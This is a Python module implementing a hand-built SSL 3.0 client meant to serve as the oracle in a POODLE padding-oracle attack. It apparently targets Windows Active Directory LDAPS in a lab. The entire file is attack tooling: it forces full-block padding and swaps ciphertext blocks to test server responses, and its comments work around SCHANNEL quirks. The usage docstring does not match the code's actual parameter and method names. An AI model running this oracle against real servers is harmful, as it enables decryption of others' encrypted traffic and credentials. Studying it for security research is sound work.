"""ssl3_client.py — Minimal SSL 3.0 client for POODLE oracle queries.

Python 3.10+ removed ssl.PROTOCOL_SSLv3, so we implement the handshake
manually using raw sockets + cryptography package.

Supports:
  TLS_RSA_WITH_AES_128_CBC_SHA  (0x002F)  — block=16, key=16, mac=20
  TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000A)  — block=8,  key=24, mac=20
"""

import socket
import struct
import os
import hashlib
from dataclasses import dataclass

from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.x509 import load_der_x509_certificate
from cryptography.hazmat.backends import default_backend

# Record content types
RT_CHANGE_CIPHER = 20
RT_ALERT         = 21
RT_HANDSHAKE     = 22
RT_APPDATA       = 23

# Handshake types
HT_CLIENT_HELLO      = 1
HT_SERVER_HELLO      = 2
HT_CERTIFICATE       = 11
HT_CERT_REQUEST      = 13
HT_SERVER_HELLO_DONE = 14
HT_CLIENT_KEY_EXCH   = 16
HT_FINISHED          = 20

# Cipher suites
CS_AES128_SHA  = b"\x00\x2f"
CS_3DES_SHA    = b"\x00\x0a"

SSL3_VERSION = b"\x03\x00"


@dataclass
class CipherSuiteSpec:
    cipher_id: bytes
    key_len: int    # bytes
    iv_len: int     # bytes
    block_size: int # bytes
    mac_len: int    # bytes = 20 for SHA-1


SUITES = {
    b"\x00\x2f": CipherSuiteSpec(b"\x00\x2f", 16, 16, 16, 20),  # AES-128-CBC-SHA
    b"\x00\x0a": CipherSuiteSpec(b"\x00\x0a", 24,  8,  8, 20),  # 3DES-EDE-CBC-SHA
}


# ── SSL 3.0 PRF ──────────────────────────────────────────────────────────────

def _ssl3_prf(secret: bytes, seed: bytes, length: int) -> bytes:
    """SSL 3.0 key material PRF.
    output = MD5(secret || SHA('A'  || secret || seed)) ||
             MD5(secret || SHA('BB' || secret || seed)) || ...
    """
    out = b""
    i = 0
    while len(out) < length:
        i += 1
        label = bytes([64 + i]) * i          # b'A', b'BB', b'CCC', …
        sha1  = hashlib.sha1(label + secret + seed).digest()
        md5   = hashlib.md5(secret + sha1).digest()
        out  += md5
    return out[:length]


def _ssl3_master_secret(pms: bytes, client_random: bytes, server_random: bytes) -> bytes:
    return _ssl3_prf(pms, client_random + server_random, 48)


def _ssl3_key_block(master: bytes, server_random: bytes, client_random: bytes,
                    total: int) -> bytes:
    return _ssl3_prf(master, server_random + client_random, total)


# ── SSL 3.0 MAC ──────────────────────────────────────────────────────────────

def ssl3_mac(mac_key: bytes, seq_num: int, content_type: int,
             data: bytes) -> bytes:
    """SSL 3.0 MAC (RFC 6101 §5.2.3.1).
    SHA1(mac_key || pad2 || SHA1(mac_key || pad1 || seq_num || type || length || data))
    """
    pad1 = b"\x36" * 40
    pad2 = b"\x5c" * 40
    seq  = struct.pack(">Q", seq_num)
    ln   = struct.pack(">H", len(data))
    inner = hashlib.sha1(mac_key + pad1 + seq + bytes([content_type]) + ln + data).digest()
    return hashlib.sha1(mac_key + pad2 + inner).digest()


# ── SSL 3.0 Padding ──────────────────────────────────────────────────────────

def ssl3_pad(data: bytes, block_size: int, force_full_block: bool = False) -> bytes:
    """SSL 3.0 CBC padding.

    If force_full_block=True, adds a full extra block of padding (pad_len=15
    for AES, pad_len=7 for 3DES). Required for the POODLE oracle to work.
    """
    if force_full_block:
        pad_len = block_size - 1
        return data + os.urandom(pad_len) + bytes([pad_len])
    pad_needed = block_size - (len(data) % block_size)
    if pad_needed == 0:
        pad_needed = block_size
    pad_len = pad_needed - 1
    return data + os.urandom(pad_len) + bytes([pad_len])


# ── AES / 3DES encrypt/decrypt ───────────────────────────────────────────────

def _aes_cbc_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    e = c.encryptor()
    return e.update(data) + e.finalize()


def _aes_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    d = c.decryptor()
    return d.update(data) + d.finalize()


def _3des_cbc_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    c = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
    e = c.encryptor()
    return e.update(data) + e.finalize()


def _3des_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    c = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
    d = c.decryptor()
    return d.update(data) + d.finalize()


def _encrypt(suite: CipherSuiteSpec, key: bytes, iv: bytes, data: bytes) -> bytes:
    if suite.block_size == 16:
        return _aes_cbc_encrypt(key, iv, data)
    return _3des_cbc_encrypt(key, iv, data)


def _decrypt(suite: CipherSuiteSpec, key: bytes, iv: bytes, data: bytes) -> bytes:
    if suite.block_size == 16:
        return _aes_cbc_decrypt(key, iv, data)
    return _3des_cbc_decrypt(key, iv, data)


# ── SSL 3.0 Finished hash ─────────────────────────────────────────────────────

_CLNT = b"\x43\x4c\x4e\x54"
_SRVR = b"\x53\x52\x56\x52"

def _ssl3_finished(hs_messages: bytes, master: bytes, sender: bytes) -> bytes:
    """SSL 3.0 Finished verify_data."""
    pad1_md5  = b"\x36" * 48
    pad1_sha1 = b"\x36" * 40
    pad2_md5  = b"\x5c" * 48
    pad2_sha1 = b"\x5c" * 40
    md5_inner  = hashlib.md5(hs_messages + sender + master + pad1_md5).digest()
    sha1_inner = hashlib.sha1(hs_messages + sender + master + pad1_sha1).digest()
    md5_outer  = hashlib.md5(master + pad2_md5 + md5_inner).digest()
    sha1_outer = hashlib.sha1(master + pad2_sha1 + sha1_inner).digest()
    return md5_outer + sha1_outer


# ── Record send/receive helpers ───────────────────────────────────────────────

def _send_record(sock: socket.socket, content_type: int, data: bytes) -> None:
    hdr = bytes([content_type]) + SSL3_VERSION + struct.pack(">H", len(data))
    sock.sendall(hdr + data)


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed by server")
        buf += chunk
    return buf


def _recv_record(sock: socket.socket) -> tuple[int, bytes]:
    hdr  = _recv_exact(sock, 5)
    ct   = hdr[0]
    length = struct.unpack(">H", hdr[3:5])[0]
    data = _recv_exact(sock, length)
    return ct, data


def _hs_msg(hs_type: int, body: bytes) -> bytes:
    return bytes([hs_type]) + struct.pack(">I", len(body))[1:] + body


# ── Certificate parsing ───────────────────────────────────────────────────────

def _parse_cert_chain(data: bytes):
    """Extract server's RSA public key from Certificate handshake body."""
    # 3-byte total length, then list of 3-byte-len + DER cert
    total_len = struct.unpack(">I", b"\x00" + data[:3])[0]
    pos = 3
    cert_len = struct.unpack(">I", b"\x00" + data[pos:pos+3])[0]
    pos += 3
    der = data[pos:pos + cert_len]
    cert = load_der_x509_certificate(der, default_backend())
    return cert.public_key()


# ── Main SSL 3.0 Client ───────────────────────────────────────────────────────

class SSL3Client:
    """Minimal SSL 3.0 client for POODLE oracle queries.

    Usage:
        client = SSL3Client("192.168.56.50", 636)
        client.connect()
        # encrypt application data with optional last-block swap
        ct, iv = client.encrypt_appdata(plaintext, swap_block=None)
        # send the raw ciphertext (possibly modified) and check response
        result = client.send_and_check(ct, iv)
        client.close()
    """

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.sock    = None
        self.suite   = None
        self.master  = None

        self.client_random = None
        self.server_random = None

        self.c_write_key = None
        self.c_write_iv  = None
        self.c_mac_key   = None
        self.s_write_key = None
        self.s_write_iv  = None
        self.s_mac_key   = None

        self._write_seq  = 0
        self._read_seq   = 0
        self._cipher_on  = False
        self._hs_log     = b""        # accumulates all handshake messages

    # ── Public API ─────────────────────────────────────────────────────────

    def connect(self) -> None:
        """Perform full SSL 3.0 handshake. Raises on failure."""
        self.sock = socket.create_connection((self.host, self.port),
                                             timeout=self.timeout)
        self.client_random = os.urandom(32)
        self._do_handshake()

    def encrypt_appdata(self, plaintext: bytes,
                         swap_last_with: bytes = None) -> tuple[bytes, bytes]:
        """Encrypt application data using the session key.

        If swap_last_with is provided (a ciphertext block), replace the last
        ciphertext block with it before returning. Used for POODLE oracle.

        Returns (ciphertext_without_iv, iv).
        In SSL 3.0, the IV for the first record is the key-material IV;
        for subsequent records it would be the last ciphertext block.
        We always use a fresh encryption (new connection per oracle query).
        """
        bs = self.suite.block_size
        mac = ssl3_mac(self.c_mac_key, self._write_seq, RT_APPDATA, plaintext)
        # Force full-block padding so the last block is entirely padding
        padded = ssl3_pad(plaintext + mac, bs, force_full_block=True)
        iv = self.c_write_iv
        ct = _encrypt(self.suite, self.c_write_key, iv, padded)

        if swap_last_with is not None:
            ct = ct[:-bs] + swap_last_with

        return ct, iv

    def send_appdata(self, plaintext: bytes) -> None:
        """Send application data normally over SSL 3.0 (standard padding)."""
        self._send_encrypted(RT_APPDATA, plaintext)

    def send_raw_appdata(self, ct: bytes, iv: bytes) -> None:
        """Send a raw (possibly modified) application data record."""
        # In SSL 3.0, the IV is not prepended to the record; it's pre-shared
        # (initial IV from key material; subsequent = last ciphertext block).
        # We always open a fresh connection per oracle query, so IV = c_write_iv.
        self._write_seq += 1
        _send_record(self.sock, RT_APPDATA, ct)

    def read_response(self) -> tuple[str, bytes]:
        """Read one record. Returns ('appdata', data), ('alert', data), or ('error', b'')."""
        try:
            self.sock.settimeout(5)
            ct_type, data = self._read_encrypted_record()
            if ct_type == RT_APPDATA:
                return "appdata", data
            if ct_type == RT_ALERT:
                return "alert", data
            return "other", data
        except (ConnectionError, OSError):
            return "error", b""

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    # ── Handshake internals ────────────────────────────────────────────────

    def _do_handshake(self) -> None:
        # ── ClientHello ──
        ch_body = self._build_client_hello()
        ch_msg  = _hs_msg(HT_CLIENT_HELLO, ch_body)
        _send_record(self.sock, RT_HANDSHAKE, ch_msg)
        self._hs_log += ch_msg

        # ── Read ServerHello + Certificate + (optional CertRequest) + ServerHelloDone ──
        server_pubkey = None
        got_done = False
        got_cert_req = False
        while not got_done:
            ct, data = _recv_record(self.sock)
            if ct == RT_ALERT:
                raise ConnectionError(f"Server alert during handshake: {data.hex()}")
            if ct != RT_HANDSHAKE:
                continue
            pos = 0
            while pos < len(data):
                ht = data[pos]
                hl = struct.unpack(">I", b"\x00" + data[pos+1:pos+4])[0]
                hb = data[pos+4 : pos+4+hl]
                self._hs_log += data[pos : pos+4+hl]

                if ht == HT_SERVER_HELLO:
                    self.server_random = hb[2:34]
                    sid_len = hb[34]
                    self.suite = SUITES.get(hb[35+sid_len : 37+sid_len])
                    if self.suite is None:
                        offered = hb[35+sid_len : 37+sid_len].hex()
                        raise NotImplementedError(f"Unsupported cipher suite: {offered}")
                    import sys
                    print(f"[DBG] ServerHello version={hb[0]:02x}{hb[1]:02x}  cipher={hb[35+sid_len:37+sid_len].hex()}  suite_block={self.suite.block_size}", file=sys.stderr)
                elif ht == HT_CERTIFICATE:
                    server_pubkey = _parse_cert_chain(hb)
                elif ht == HT_CERT_REQUEST:
                    got_cert_req = True
                    import sys as _sys
                    print(f"[DBG] CertificateRequest received — will send empty Certificate", file=_sys.stderr)
                elif ht == HT_SERVER_HELLO_DONE:
                    got_done = True
                    break
                pos += 4 + hl

        # ── Client Certificate (empty — sent only if server requested one) ──
        if got_cert_req:
            # Empty certificate list signals "no client certificate available".
            # Windows AD LDAPS accepts this and falls back to application-layer auth.
            empty_cert_msg = _hs_msg(HT_CERTIFICATE, b"\x00\x00\x00")
            _send_record(self.sock, RT_HANDSHAKE, empty_cert_msg)
            self._hs_log += empty_cert_msg

        # ── ClientKeyExchange ──
        pms = bytes([3, 0]) + os.urandom(46)             # SSL 3.0 pre-master
        enc_pms = server_pubkey.encrypt(pms, PKCS1v15())
        # SSL 3.0 spec (RFC 6101) has NO 2-byte length prefix for RSA CKE.
        # TLS 1.0+ adds one. Windows SCHANNEL SSL 3.0 mode follows the spec.
        cke_body = enc_pms
        cke_msg  = _hs_msg(HT_CLIENT_KEY_EXCH, cke_body)
        import sys as _sys
        print(f"[DBG] CKE body_len={len(cke_body)}  first8={cke_body[:8].hex()}  enc_pms_len={len(enc_pms)}", file=_sys.stderr)
        _send_record(self.sock, RT_HANDSHAKE, cke_msg)
        self._hs_log += cke_msg

        # ── Key derivation ──
        self.master = _ssl3_master_secret(pms, self.client_random, self.server_random)
        s = self.suite
        total_km = s.mac_len + s.mac_len + s.key_len + s.key_len + s.iv_len + s.iv_len
        km = _ssl3_key_block(self.master, self.server_random, self.client_random, total_km)
        idx = 0
        self.c_mac_key  = km[idx:idx+s.mac_len]; idx += s.mac_len
        self.s_mac_key  = km[idx:idx+s.mac_len]; idx += s.mac_len
        self.c_write_key= km[idx:idx+s.key_len]; idx += s.key_len
        self.s_write_key= km[idx:idx+s.key_len]; idx += s.key_len
        self.c_write_iv = km[idx:idx+s.iv_len];  idx += s.iv_len
        self.s_write_iv = km[idx:idx+s.iv_len];  idx += s.iv_len

        # ── ChangeCipherSpec ──
        _send_record(self.sock, RT_CHANGE_CIPHER, b"\x01")
        self._cipher_on = True
        self._write_seq = 0

        # ── Finished ──
        fin_data = _ssl3_finished(self._hs_log, self.master, _CLNT)
        fin_msg  = _hs_msg(HT_FINISHED, fin_data)
        self._send_encrypted(RT_HANDSHAKE, fin_msg)
        # don't add encrypted finished to hs_log (sent after CCS)

        # ── Wait for server CCS + Finished ──
        got_ccs = False
        got_fin = False
        while not (got_ccs and got_fin):
            ct, data = _recv_record(self.sock)
            if ct == RT_CHANGE_CIPHER:
                self._read_seq = 0
                got_ccs = True
            elif ct == RT_HANDSHAKE and got_ccs:
                # Decrypt server Finished
                plain = self._decrypt_record(data)
                got_fin = True
            elif ct == RT_ALERT:
                raise ConnectionError(f"Server alert after CCS: {data.hex()}")

    def _build_client_hello(self) -> bytes:
        # version (2) + random (32) + session_id_len (1) + cipher_suites + compression
        # Only offer SSL 3.0-native ciphers — Windows SCHANNEL RSTs if it sees
        # TLS-only cipher IDs (e.g. 0x002F) in an SSLv3 ClientHello.
        cipher_list = CS_3DES_SHA
        body = (
            SSL3_VERSION
            + self.client_random
            + b"\x00"                                  # session_id length = 0
            + struct.pack(">H", len(cipher_list))      # cipher suites length
            + cipher_list
            + b"\x01\x00"                              # 1 compression method: null
        )
        return body

    def _send_encrypted(self, content_type: int, plaintext: bytes) -> None:
        bs = self.suite.block_size
        mac = ssl3_mac(self.c_mac_key, self._write_seq, content_type, plaintext)
        padded = ssl3_pad(plaintext + mac, bs)
        ct = _encrypt(self.suite, self.c_write_key, self.c_write_iv, padded)
        # Update IV (last ciphertext block)
        self.c_write_iv = ct[-bs:]
        self._write_seq += 1
        _send_record(self.sock, content_type, ct)

    def _decrypt_record(self, ct: bytes) -> bytes:
        bs = self.suite.block_size
        plain = _decrypt(self.suite, self.s_write_key, self.s_write_iv, ct)
        self.s_write_iv = ct[-bs:]
        self._read_seq += 1
        return plain

    def _read_encrypted_record(self) -> tuple[int, bytes]:
        ct_type, data = _recv_record(self.sock)
        if ct_type in (RT_ALERT,):
            return ct_type, data  # alerts are not encrypted after CCS in all cases
        plain = self._decrypt_record(data)
        return ct_type, plain
